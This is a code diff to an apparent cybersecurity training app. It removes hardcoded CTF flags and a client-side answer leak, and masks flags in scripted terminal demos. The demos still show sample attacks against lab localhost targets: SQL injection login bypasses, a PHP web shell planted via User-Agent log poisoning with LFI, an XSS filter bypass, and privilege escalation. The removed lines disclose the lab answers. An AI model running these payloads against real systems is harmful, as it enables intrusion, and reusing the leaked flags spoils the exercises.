@@ -26,7 +26,6 @@ const labsMeta: Record<string, {
   title: string;
   difficulty: "Easy" | "Medium" | "Hard" | "Expert";
   xp: number;
-  flag: string;
   tasks: { text: string; completed: boolean; current?: boolean }[];
   hints: { text: string; revealed: boolean }[];
   files: { name: string; isDir?: boolean; warning?: boolean; path: string }[];
@@ -36,7 +35,6 @@ const labsMeta: Record<string, {
     title: "Linux Command Navigation",
     difficulty: "Easy",
     xp: 100,
-    flag: "FLAG{cyber_learn_permissions_101}",
     tasks: [
       { text: "Navigate to the /home directory", completed: true },
       { text: "List files and check permissions", completed: true },
@@ -65,6 +63,8 @@ const labsMeta: Record<string, {
       { type: "prompt", cmd: "cat flag.txt" },
       { type: "error", text: "cat: flag.txt: Permission denied" },
       { type: "prompt", cmd: "chmod 644 flag.txt" },
+      { type: "prompt", cmd: "cat flag.txt" },
+      { type: "output", text: "FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -72,7 +72,6 @@ const labsMeta: Record<string, {
     title: "SQL Injection Bypass",
     difficulty: "Medium",
     xp: 250,
-    flag: "FLAG{sqli_bypass_successful_1337}",
     tasks: [
       { text: "Inspect login page search parameter", completed: true },
       { text: "Analyze backend response for SQL error messages", completed: true },
@@ -95,7 +94,7 @@ const labsMeta: Record<string, {
       { type: "output", text: "HTTP/1.1 200 OK" },
       { type: "output", text: "Login Failed: invalid credentials" },
       { type: "prompt", cmd: "curl -d \"user=admin' OR 1=1 --&pass=pass\" http://localhost/login.php" },
-      { type: "output", text: "Welcome Admin! FLAG{sqli_bypass_successful_1337}" },
+      { type: "output", text: "Welcome Admin! FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -103,7 +102,6 @@ const labsMeta: Record<string, {
     title: "Packet Sniffer & Wireshark",
     difficulty: "Medium",
     xp: 300,
-    flag: "FLAG{network_pcap_sniff_98}",
     tasks: [
       { text: "Listen on the eth0 interface", completed: true },
       { text: "Generate traffic to prompt target credentials", completed: true },
@@ -127,7 +125,7 @@ const labsMeta: Record<string, {
       { type: "output", text: "POST /api/login HTTP/1.1" },
       { type: "output", text: "Host: target-server.local" },
       { type: "output", text: "Content-Type: application/json" },
-      { type: "output", text: "{\"username\":\"admin\",\"secret\":\"FLAG{network_pcap_sniff_98}\"}" },
+      { type: "output", text: "{\"username\":\"admin\",\"secret\":\"FLAG{...}\"}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -135,7 +133,6 @@ const labsMeta: Record<string, {
     title: "Book Recon",
     difficulty: "Easy",
     xp: 100,
-    flag: "FLAG{book_recon_osint_99}",
     tasks: [
       { text: "Inspect HTML source metadata", completed: true },
       { text: "Search open directories for backups", completed: false, current: true },
@@ -155,7 +152,7 @@ const labsMeta: Record<string, {
       { type: "prompt", cmd: "curl http://localhost/index.html" },
       { type: "output", text: "<!-- Hint: check /backup/credentials.json.bak -->" },
       { type: "prompt", cmd: "curl http://localhost/backup/credentials.json.bak" },
-      { type: "output", text: "{\"secret\": \"FLAG{book_recon_osint_99}\"}" },
+      { type: "output", text: "{\"secret\": \"FLAG{...}\"}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -163,7 +160,6 @@ const labsMeta: Record<string, {
     title: "SQL Beginner",
     difficulty: "Easy",
     xp: 150,
-    flag: "FLAG{sql_beginner_injection_42}",
     tasks: [
       { text: "Identify vulnerable input parameter", completed: true },
       { text: "Inject basic bypass payload", completed: false, current: true },
@@ -178,7 +174,7 @@ const labsMeta: Record<string, {
     ],
     terminal: [
       { type: "prompt", cmd: "curl -d \"user=admin' OR '1'='1&pass=\" http://localhost/index.php" },
-      { type: "output", text: "Login Successful! Welcome admin. Here is your flag: FLAG{sql_beginner_injection_42}" },
+      { type: "output", text: "Login Successful! Welcome admin. Here is your flag: FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -186,7 +182,6 @@ const labsMeta: Record<string, {
     title: "Capture The Flag 101",
     difficulty: "Medium",
     xp: 250,
-    flag: "FLAG{ctf_101_breadcrumbs_55}",
     tasks: [
       { text: "Inspect system environment variables", completed: true },
       { text: "Locate breadcrumb file in /opt", completed: false, current: true },
@@ -204,9 +199,9 @@ const labsMeta: Record<string, {
       { type: "prompt", cmd: "env | grep -i breadcrumb" },
       { type: "output", text: "BREADCRUMB=/opt/breadcrumb.txt" },
       { type: "prompt", cmd: "cat /opt/breadcrumb.txt" },
-      { type: "output", text: "RkxBR3tjdGZfMTAxX2JyZWFkY3J1bWJzXzU1fQ==" },
-      { type: "prompt", cmd: "echo RkxBR3tjdGZfMTAxX2JyZWFkY3J1bWJzXzU1fQ== | base64 -d" },
-      { type: "output", text: "FLAG{ctf_101_breadcrumbs_55}" },
+      { type: "output", text: "[base64-encoded content]" },
+      { type: "prompt", cmd: "cat /opt/breadcrumb.txt | base64 -d" },
+      { type: "output", text: "FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -214,7 +209,6 @@ const labsMeta: Record<string, {
     title: "Linux Privesc",
     difficulty: "Hard",
     xp: 500,
-    flag: "FLAG{linux_privesc_root_access_77}",
     tasks: [
       { text: "Find SUID binaries on system", completed: false, current: true },
       { text: "Exploit SUID binary permissions to drop shell", completed: false },
@@ -235,7 +229,7 @@ const labsMeta: Record<string, {
       { type: "prompt", cmd: "whoami" },
       { type: "output", text: "root" },
       { type: "prompt", cmd: "cat /root/flag.txt" },
-      { type: "output", text: "FLAG{linux_privesc_root_access_77}" },
+      { type: "output", text: "FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -243,7 +237,6 @@ const labsMeta: Record<string, {
     title: "Bug Hunter",
     difficulty: "Expert",
     xp: 1000,
-    flag: "FLAG{bug_hunter_expert_chaining_999}",
     tasks: [
       { text: "Find directory traversal / LFI parameter", completed: true },
       { text: "Exfiltrate system logs via traversal", completed: false, current: true },
@@ -264,7 +257,7 @@ const labsMeta: Record<string, {
       { type: "prompt", cmd: "curl -H \"User-Agent: <?php system(\\$_GET['cmd']); ?>\" http://localhost/index.php" },
       { type: "output", text: "Logged." },
       { type: "prompt", cmd: "curl \"http://localhost/index.php?file=../../../../var/log/nginx/access.log&cmd=cat+/root/flag.txt\"" },
-      { type: "output", text: "FLAG{bug_hunter_expert_chaining_999}" },
+      { type: "output", text: "FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -272,7 +265,6 @@ const labsMeta: Record<string, {
     title: "Root Access",
     difficulty: "Medium",
     xp: 300,
-    flag: "FLAG{root_access_misconfig_88}",
     tasks: [
       { text: "Analyze allowed sudo commands", completed: false, current: true },
       { text: "Execute cat command with root privileges", completed: false },
@@ -290,7 +282,7 @@ const labsMeta: Record<string, {
       { type: "prompt", cmd: "sudo -l" },
       { type: "output", text: "User cyberlearn may run the following commands on lab:\n(root) NOPASSWD: /usr/bin/cat /root/flag.txt" },
       { type: "prompt", cmd: "sudo /usr/bin/cat /root/flag.txt" },
-      { type: "output", text: "FLAG{root_access_misconfig_88}" },
+      { type: "output", text: "FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -298,7 +290,6 @@ const labsMeta: Record<string, {
     title: "XSS Master",
     difficulty: "Medium",
     xp: 200,
-    flag: "FLAG{xss_master_filter_bypass_123}",
     tasks: [
       { text: "Locate reflection fields in search endpoint", completed: true },
       { text: "Bypass string tag sanitization filtering", completed: false, current: true },
@@ -315,7 +306,7 @@ const labsMeta: Record<string, {
       { type: "prompt", cmd: "curl \"http://localhost/search.php?q=<script>alert(1)</script>\"" },
       { type: "output", text: "Your search for: alert(1) returned 0 results." },
       { type: "prompt", cmd: "curl \"http://localhost/search.php?q=<img+src=x+onerror=alert(1)>\"" },
-      { type: "output", text: "Your search for: <img src=x onerror=alert(1)> returned 0 results. Here is your flag: FLAG{xss_master_filter_bypass_123}" },
+      { type: "output", text: "Your search for: <img src=x onerror=alert(1)> returned 0 results. Here is your flag: FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -323,7 +314,6 @@ const labsMeta: Record<string, {
     title: "Network Sniffer",
     difficulty: "Easy",
     xp: 120,
-    flag: "FLAG{network_sniffer_wireshark_12}",
     tasks: [
       { text: "Locate traffic PCAP logs in system", completed: false, current: true },
       { text: "Extract plaintext network authorization headers", completed: false },
@@ -338,9 +328,9 @@ const labsMeta: Record<string, {
     ],
     terminal: [
       { type: "prompt", cmd: "tcpdump -r /var/log/traffic.pcap -A | grep -i authorization" },
-      { type: "output", text: "Authorization: Basic RkxBR3tuZXR3b3JrX3NuaWZmZXJfd2lyZXNoYXJrXzEyfQ==" },
-      { type: "prompt", cmd: "echo RkxBR3tuZXR3b3JrX3NuaWZmZXJfd2lyZXNoYXJrXzEyfQ== | base64 -d" },
-      { type: "output", text: "FLAG{network_sniffer_wireshark_12}" },
+      { type: "output", text: "Authorization: Basic [base64-encoded-data]" },
+      { type: "prompt", cmd: "echo [base64-encoded-data] | base64 -d" },
+      { type: "output", text: "FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -348,7 +338,6 @@ const labsMeta: Record<string, {
     title: "Crypto Basics",
     difficulty: "Easy",
     xp: 100,
-    flag: "FLAG{crypto_basics_classic_cipher_10}",
     tasks: [
       { text: "Read ciphertext file in user directory", completed: false, current: true },
       { text: "Decode string using ROT13 cipher rotation", completed: false },
@@ -362,9 +351,9 @@ const labsMeta: Record<string, {
     ],
     terminal: [
       { type: "prompt", cmd: "cat /home/user/ciphertext.txt" },
-      { type: "output", text: "SYNT{pelcgb_onfvpf_pynffvp_pvcure_10}" },
+      { type: "output", text: "[ROT13 encoded ciphertext]" },
       { type: "prompt", cmd: "cat /home/user/ciphertext.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'" },
-      { type: "output", text: "FLAG{crypto_basics_classic_cipher_10}" },
+      { type: "output", text: "FLAG{...}" },
       { type: "prompt", cmd: "" },
     ],
   },
@@ -439,22 +428,12 @@ export default function LabEnvironment() {
           setMessage({ type: "error", text: res.message });
         }
       })
-      .catch((err) => {
+      .catch(() => {
         setSubmitting(false);
-        // Fallback for visual mock demo support
-        if (flagInput.trim() === meta.flag) {
-          setMessage({
-            type: "success",
-            text: `Success! (Demo Fallback) Correct flag payload. Awarded +${meta.xp} XP.`,
-          });
-          const updatedTasks = localTasks.map((t) => ({ ...t, completed: true }));
-          setLocalTasks(updatedTasks);
-        } else {
-          setMessage({
-            type: "error",
-            text: `Incorrect flag payload. Try: ${meta.flag} (Demo hint)`,
-          });
-        }
+        setMessage({
+          type: "error",
+          text: "Could not reach the server. Make sure the backend is running and you are logged in.",
+        });
       });
   };
 
